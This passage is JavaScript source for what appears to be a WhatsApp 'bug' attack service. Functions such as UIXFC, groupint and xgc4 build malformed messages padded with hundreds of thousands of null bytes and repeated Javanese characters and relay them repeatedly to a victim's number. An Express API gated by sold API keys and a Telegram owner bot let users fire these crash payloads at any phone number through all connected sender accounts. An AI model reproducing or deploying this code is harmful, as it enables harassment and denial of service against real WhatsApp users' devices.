                footerText: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "𝑫𝒂𝒑𝒛𝒚" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "13135550002@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/kirana_Offc",
              buttonTitle: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363415983819549@newsletter",
              serverMessageId: 1,
              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "@13135550002".repeat(2999),
        },
        messageContextInfo: {
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: '💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡⃢↯🔥' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡⃢↯🔥" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(``);
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await sock.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  console.log(``);
}

async function UIXFC(sock, target) {  
  for (let i = 0; i < 70; i++) {
    try {
      const msg = {
        viewOnceMessage: {
          message: {         
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },            
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },                
                forwardedNewsletterMessageInfo: {
                 newsletterJid: "0@newsletter",
                 serverMessageId: 1,
                 newsletterName: `@13135550002${"ꦽ".repeat(100)}`,
                 contentType: 3,
                 accessibilityText: "kontol",
                },
                externalAdReply: {
                  title: "X",
                  body: "DEFAULT",
                  mediaType: 1,
                  thumbnail: null,
                  sourceUrl: "https://t.me/cinta_yang_terabaikan",
                },              
              },
              header: {
                title: "𑲭𑲭͠༑‌⃟༑𝐅𝐋𝚯𝚯𝐃  ラ‣ 𐎟𑆻,\n\n\n" + "ꦽ".repeat(9999),
                hasMediaAttachment: false,
              },
              body: {
                text: "ꦽ".repeat(1000),
              },
              nativeFlowMessage: {
                messageParamsJson: "{{".repeat(10000),
                buttons: [  
                {
                   name: "single_select",
                   buttonParamsJson: JSON.stringify({ status: true }),
                },
                {
                   name: "mpm",
                   buttonParamsJson: JSON.stringify({ status: true }),
                },
                {                
                   name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME\"},\"flow_cta\":\":)\",\"flow_id\":\"BY ZYURAA\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}",
                },
                {
                   name: "call_permission_request",
                   buttonParamsJson: JSON.stringify({ status: 999 }),
                },
                {
                   name: "contact_permission_request",
                   buttonParamsJson: JSON.stringify({ status: true }),
                }, 
               ],
              },              
            },
          },
        },
      };

      const sentMsg = await sock.relayMessage(target, msg, {
        messageId: sock.generateMessageTag(),
      });
      
      await sock.sendMessage(target, {
        delete: {
          remoteJid: target,
          fromMe: true,
          id: sentMsg.key.id,
          participant: target,
        },
      });
    } catch (err) {
      console.log(`[ERROR] Iterasi ke-${i + 1} gagal: ${err.message}`);
    }
  }

  console.log("✅ UIXFC SUCCESSFULLY SENT & DELETED IN LOOP");
}


async function sendBugList(sock, target) {
  const message = generateWAMessageFromContent(target, proto.Message.fromObject({
    listMessage: {
      title: "⟠⿻ 𝕾𝖙𝖗𝖆𝖛𝖆𝕺𝖋𝖈 々" + "{".repeat(1000),
      footerText: "𝕾𝖙𝖗𝖆𝖛𝖆𝕺𝖋𝖈",
      description: "𝕭𝖚𝖌𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕",
      buttonText: null,
      listType: 2,
      productListInfo: {
        productSections: [
          {
            title: "anjay",
            products: [
              {
                productId: "4392524570816732"
              }
            ]
          }
        ],
        productListHeaderImage: {
          productId: "4392524570816732",
          jpegThumbnail: null
        },
        businessOwnerJid: "0@s.whatsapp.net"
      }
    },
    footer: "puki",
    contextInfo: {
      expiration: 604800,
      ephemeralSettingTimestamp: "1679959486",
      entryPointConversionSource: "global_search_new_chat",
      entryPointConversionApp: "whatsapp",
      entryPointConversionDelaySeconds: 9,
      disappearingMode: {
        initiator: "INITIATED_BY_ME"
      }
    },
    selectListType: 2,
    product_header_info: {
      product_header_info_id: 29233640912,
      product_header_is_rejected: false
    }
  }), {
    userJid: target
  })

  await sock.relayMessage(target, message.message, {
    participant: target,
    messageId: message.key.id
  })
}

async function groupint(sock, target) {
const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  try {
  for (let i = 0; i < 70; i++) {
    const payload = {
      message: {
        viewOnceMessage: {
          message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            },                                     
              noteMessage: {
                extendedTextMessage: {
                  text: "ꦾ".repeat(20000) + "@1".repeat(20000),
                  contextInfo: {
                    mentionedJid: [target],
                    isForwarded: true,
                    forwardingScore: 999,          
                    quotedMessage: {                     
                      conversation:
                        "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ INV𝚫𝚰𝚴 ⿻ ▾ ༑̴⟆̊‏" +
                        "ꦾ".repeat(30000),
                    },                    
                    disappearingMode: {
                      initiator: "CHANGED_IN_CHAT",
                      trigger: "CHAT_SETTING",
                    },
                  },
                  inviteLinkGroupTypeV2: "DEFAULT",
                },
              },                     
             groupInviteMessage: {
              groupJid: `0@g.us`,
              inviteCode: "ZXR-",
              inviteExpiration: 9999999999,
              groupName: "ꦾ..".repeat(200), 
              caption: "Zyuraa`X\n\n\n" + "ꦾ".repeat(57000),
              jpegThumbnail: undefined,
              admin: "0@s.whatsapp.net",
              groupType: "DEFAULT",
              groupCreator: "0@s.whatsapp.net",
              groupDescription: "{".repeat(99999),
              groupLocked: false,              
            },
            paymentInviteMessage: {
              serviceType: "UPI",
              expiryTimestamp: Date.now() + 5184000000,
            },
          },
        },
      },
    };

    await sock.relayMessage(target, payload.message, {
      additionalNodes: virtex,
      messageId: null + Date.now(),
    });
   }
    
    console.log(`✅ Bug WA groupInvite FULL dikirim ke ${target}`);
  } catch (err) {
    console.error("❌ Gagal kirim bug group invite:", err);
  }
}

async function xgc4(target) {
 try {
   const messsage = {
      botInvokeMessage: {
       message: {
        newsletterAdminInviteMessage: {
         newsletterJid: '33333333333333333@newsletter',
         newsletterName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(10000),
         jpegThumbnail: "",
         caption: "ꦽ".repeat(12000),
         inviteExpiration: Date.now() + 1814400000,
        },
       },
      },
     };
    await sock.relayMessage(target, messsage, {
      userJid: target,
     });
     
   console.log(`Bug WA groupInvite FULL dikirim ke ${target}`);  
   } catch (err) {
  console.log(err);
 }
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'zhee', 'zyuraa.html'));
});

app.get("/api/v2/zyr", checkApikey, async (req, res) => {
  const { target } = req.query;
  if (!target) return res.status(400).json({ status: false, message: 'parameter target diperlukan' });

  const sanitized = String(target).replace(/[^0-9]/g, '');
  if (!sanitized || sanitized.length < 8) {
    return res.status(400).json({ status: false, message: 'nomor tidak valid' });
  }
  if (sanitized.startsWith('0')) {
    return res.status(400).json({ status: false, message: 'gunakan awalan kode negara (contoh: 62...)' });
  }

  const jid = sanitized + "@s.whatsapp.net";
  const info = getClientInfo(req);

  const connected = Array.from(sessions.values()).filter(sock => sock && typeof sock.relayMessage === "function");

  if (connected.length === 0) {
    return res.json({
      creator: "Zyuraa`X",
      status: "Cancel",
      masalah: "No sender aktif",
      "rest-api": "Active"
    });
  }

  try {
    for (const sock of connected) {      
      for (let i = 0; i < 1; i++) {                
        await groupint(sock, jid)    
        await delay(2000) 
        await xgc4(sock, jid) 
        await UIXFC(sock, jid) 
        await delay(1000) 
      }
    }

    console.log(`
--------- [ SUKSES BUG ] ----------
Target: ${jid}
Request: ${info.ip} 
time=${info.timestamp}`);

    res.json({
      creator: "Zyuraa`X",
      status: "Sender aktif",
      sending: "Success",
      target: jid,
      sender: connected.length
    });

  } catch (err) {
    console.error("❌ ERROR relay:", err);
    res.status(500).json({ status: false, error: err.message });
  }
});

app.get("/api/v3/zyr", checkApikey, async (req, res) => {
  const { target } = req.query;
  if (!target) return res.status(400).json({ status: false, message: 'parameter target diperlukan' });

  const sanitized = String(target).replace(/[^0-9]/g, '');
  if (!sanitized || sanitized.length < 8) {
    return res.status(400).json({ status: false, message: 'nomor tidak valid' });
  }
  if (sanitized.startsWith('0')) {
    return res.status(400).json({ status: false, message: 'gunakan awalan kode negara (contoh: 62...)' });
  }

  const jid = sanitized + "@s.whatsapp.net";
  const info = getClientInfo(req);

  const connected = Array.from(sessions.values()).filter(sock => sock && typeof sock.relayMessage === "function");

  if (connected.length === 0) {
    return res.json({
      creator: "Zyuraa`X",
      status: "Cancel",
      masalah: "No sender aktif",
      "rest-api": "Active"
    });
  }

  try {
    for (const sock of connected) {
      for (let i = 0; i < 1; i++) {
        await groupint(sock, jid)    
        await delay(2000) 
        await xgc4(sock, jid) 
        await UIXFC(sock, jid) 
        await delay(1000) 
      }
    }

    console.log(`
--------- [ SUKSES BUG ] ----------
Target: ${jid}
Request: ${info.ip} 
time=${info.timestamp}`);

    res.json({
      creator: "Zyuraa`X",
      status: "Sender aktif",
      sending: "Success",
      target: jid,
      sender: connected.length
    });

  } catch (err) {
    console.error("❌ ERROR relay:", err);
    res.status(500).json({ status: false, error: err.message });
  }
});

app.get("/api/cek/apikey", (req, res) => {
  const apikey = req.query.apikey;
  if (!apikey) {
    return res.status(400).json({
      creator: "Zyuraa`X",
      status: "error",
      message: "apikey dibutuhkan"
    });
  }

  const path = "./zhee/apikey.json";
  if (!fs.existsSync(path)) {
    return res.status(404).json({
      creator: "Zyuraa`X",
      status: "error",
      message: "database apikey tidak ditemukan"
    });
  }

  const db = JSON.parse(fs.readFileSync(path));
  const data = db[apikey];
  if (!data) {
    return res.status(404).json({
      creator: "Zyuraa`X",
      status: "error",
      message: "apikey tidak ditemukan"
    });
  }

  const [dd, mm, yyyy] = data.expired.split("-");
  const expiredDate = new Date(`${yyyy}-${mm}-${dd}`);
  const now = new Date();

  const status = now <= expiredDate ? "on" : "off";

  return res.json({
    creator: "Zyuraa`X",
    expired: data.expired,
    status: status
  });
});

app.get("/api/cek/sender", checkApikey, (req, res) => {
  const jumlah = sessions.size;

  res.json({
    creator: "Zyuraa`X",
    status: "Active",
    sender: jumlah > 0 ? "on" : "off",
    jumlah: jumlah
  });
});

app.get("/api/apikey/create", (req, res) => {
  const expired = req.query.expired;

  if (!expired || !/^\d{2}-\d{2}-\d{4}$/.test(expired)) {
    return res.status(400).json({
      creator: "Zyuraa`X",
      status: "error",
      message: "expired format harus dd-mm-yyyy"
    });
  }

  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const random = [...Array(20)].map(() => chars[Math.floor(Math.random() * chars.length)]).join("");
  const key = `zyr_${random}`;

  const file = "./zhee/apikey.json";
  let db = {};

  if (!fs.existsSync("./zhee")) fs.mkdirSync("./zhee");
  if (fs.existsSync(file)) {
    const content = fs.readFileSync(file, "utf-8").trim();
    try {
      db = content ? JSON.parse(content) : {};
    } catch (e) {
      console.warn("⚠️ File apikey.json rusak, mengganti dengan data kosong...");
      db = {};
    }
  }

  db[key] = { expired };
  fs.writeFileSync(file, JSON.stringify(db, null, 2));

  res.json({
    creator: "Zyuraa`X",
    status: "success",
    apikey: key,
    expired
  });
});

// ============ FITUR TELEGRAM YANG TAU AJA ============== 

/*
╔═══╦═══╦╗╔╗╔╦═══╦═══╦═══╦═══╗
║╔═╗║╔═╗║║║║║║╔══╣╔═╗║╔══╩╗╔╗║
║╚═╝║║─║║║║║║║╚══╣╚═╝║╚══╗║║║║
║╔══╣║─║║╚╝╚╝║╔══╣╔╗╔╣╔══╝║║║║
║║──║╚═╝╠╗╔╗╔╣╚══╣║║╚╣╚══╦╝╚╝║
╚╝──╚═══╝╚╝╚╝╚═══╩╝╚═╩═══╩═══╝
╔════╦╗──╔╦╗─╔╦═══╦═══╦═══╗
╚══╗═║╚╗╔╝║║─║║╔═╗║╔═╗║╔═╗║
──╔╝╔╩╗╚╝╔╣║─║║╚═╝║║─║║║─║║
─╔╝╔╝─╚╗╔╝║║─║║╔╗╔╣╚═╝║╚═╝║
╔╝═╚═╗─║║─║╚═╝║║║╚╣╔═╗║╔═╗║
╚════╝─╚╝─╚═══╩╝╚═╩╝─╚╩╝─╚╝
*/


// ============ FITUR TELEGRAM YANG TAU AJA ============== 

bot.onText(/\/start/, (msg) => {
  if (msg.chat.id.toString() !== ownerChatId) return;

  const menu = `👋 Selamat datang, Owner!

🛠 Menu Bot:

/addbot ➜ Tambah nomor WhatsApp bot
/listbot ➜ Lihat bot aktif

All rest api use apikey!! 
`;

  bot.sendMessage(msg.chat.id, menu, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "➕ Add Bot", callback_data: "addbot" },
          { text: "📋 List Bot", callback_data: "listbot" }
        ]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;
  if (chatId.toString() !== ownerChatId) return;

  if (data === "addbot") return bot.sendMessage(chatId, "/addbot");
  if (data === "listbot") return bot.sendMessage(chatId, "/listbot");

  bot.answerCallbackQuery(query.id);
});

bot.onText(/\/addbot(?:\s+(\d+))?/, async (msg, match) => {
  if (msg.chat.id.toString() !== ownerChatId) return;
  const nomor = match[1];

  if (nomor && /^[0-9]{10,15}$/.test(nomor)) {
    await connectToWhatsApp(nomor, msg.chat.id, bot);
  } else {
    return bot.sendMessage(msg.chat.id, "❌ Nomor tidak valid atau tidak disertakan. Contoh: /addbot 628xxxxxx");
  }
});

bot.onText(/\/listbot/, (msg) => {
  if (msg.chat.id.toString() !== ownerChatId) return;

  if (!fs.existsSync(SESSIONS_FILE)) {
    return bot.sendMessage(msg.chat.id, "❌ Belum ada bot yang tertaut.");
  }

  const data = JSON.parse(fs.readFileSync(SESSIONS_FILE));
  const list = data.map(n => `• ${n}`).join("\n") || "❌ Tidak ada.";
  bot.sendMessage(msg.chat.id, `📋 Bot Aktif:\n${list}`);
});